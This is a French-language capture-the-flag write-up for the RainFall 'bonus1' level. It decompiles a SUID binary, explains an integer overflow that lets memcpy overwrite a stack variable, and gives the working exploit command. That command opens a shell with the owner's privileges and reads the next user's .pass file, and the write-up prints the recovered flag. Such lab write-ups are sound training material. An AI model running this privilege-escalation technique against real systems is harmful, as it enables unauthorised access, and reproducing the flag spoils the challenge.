# RainFall CTF - Bonus1

## Reconnaissance

### Fichier trouvé
```bash
bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `bonus2` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `bonus2`

## Analyse statique avec Ghidra

### Code décompilé
```c
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 uVar1;
  undefined1 local_3c [40];
  int local_14;
  
  local_14 = atoi(*(char **)(param_2 + 4));
  if (local_14 < 10) {
    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
    if (local_14 == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

### Code traduit en langage compréhensible
```c
int main(int argc, char **argv) {
    char buffer[40];
    int num;
    
    num = atoi(argv[1]);                    // Convertit argv[1] en entier
    if (num < 10) {
        memcpy(buffer, argv[2], num * 4);   // Copie num*4 bytes d'argv[2]
        if (num == 0x574f4c46) {            // Vérifie si num == "FLOW"
            execl("/bin/sh", "sh", 0);      // Lance un shell !
        }
        return 0;
    } else {
        return 1;
    }
}
```

## Analyse des vulnérabilités

### Buffer Overflow avec Integer Overflow
La vulnérabilité réside dans la ligne :
```c
memcpy(local_3c, *(void **)(param_2 + 8), local_14 * 4);
```

**Problèmes identifiés :**
1. **Vérification insuffisante** : `local_14 < 10` ne protège pas contre les nombres négatifs
2. **Integer overflow** : `local_14 * 4` peut déborder avec des valeurs négatives
3. **Pas de vérification de taille** pour le buffer de 40 octets

### Condition de victoire
Pour obtenir un shell, il faut que `local_14 == 0x574f4c46` ("FLOW" en ASCII).

## Stratégie d'exploitation

### Objectif
Écraser la variable `local_14` avec la valeur `0x574f4c46` tout en contournant la condition `local_14 < 10`.

### Layout de la pile
```
Stack Layout:
[buffer - 40 bytes] [local_14 - 4 bytes]
```

Pour écraser `local_14`, nous devons copier `40 + 4 = 44` octets.

### Calcul de l'integer overflow

#### Étape 1 : Trouver la valeur qui donne 44 octets
Nous voulons : `local_14 * 4 = 44`
Donc : `local_14 = 11`

#### Étape 2 : Contourner la condition avec l'overflow
Puisque `11 > 10`, nous devons utiliser un nombre négatif qui, multiplié par 4, donne 44.

En arithmétique 32-bit avec overflow :
```
local_14 = 11 + (2^32 / 4) * (-1)
local_14 = 11 - 1073741824
local_14 = -1073741813
```

#### Vérification
- `local_14 = -1073741813 < 10` ✓ (passe la condition)
- `local_14 * 4 = 44` ✓ (après overflow 32-bit)

## Construction de l'exploit

### Structure du payload
```
Payload = [buffer_remplissage] + [valeur_FLOW]
        = 'A' * 40 + '\x46\x4c\x4f\x57'
```

### Explication des composants
1. **`'A' * 40`** : Remplit le buffer de 40 octets
2. **`'\x46\x4c\x4f\x57'`** : Valeur `0x574f4c46` ("FLOW") en little-endian

### Arguments du programme
- **argv[1]** : `"-1073741813"` (notre valeur calculée)
- **argv[2]** : Le payload de 44 octets

## Exploitation finale

### Commande d'exploitation
```bash
./bonus1 "-1073741813" "$(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")"
```

### Résultat
```bash
bonus1@RainFall:~$ ./bonus1 "-1073741813" "$(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")"
$ ls
ls: cannot open directory .: Permission denied
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Résultats

### Flag obtenu
```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
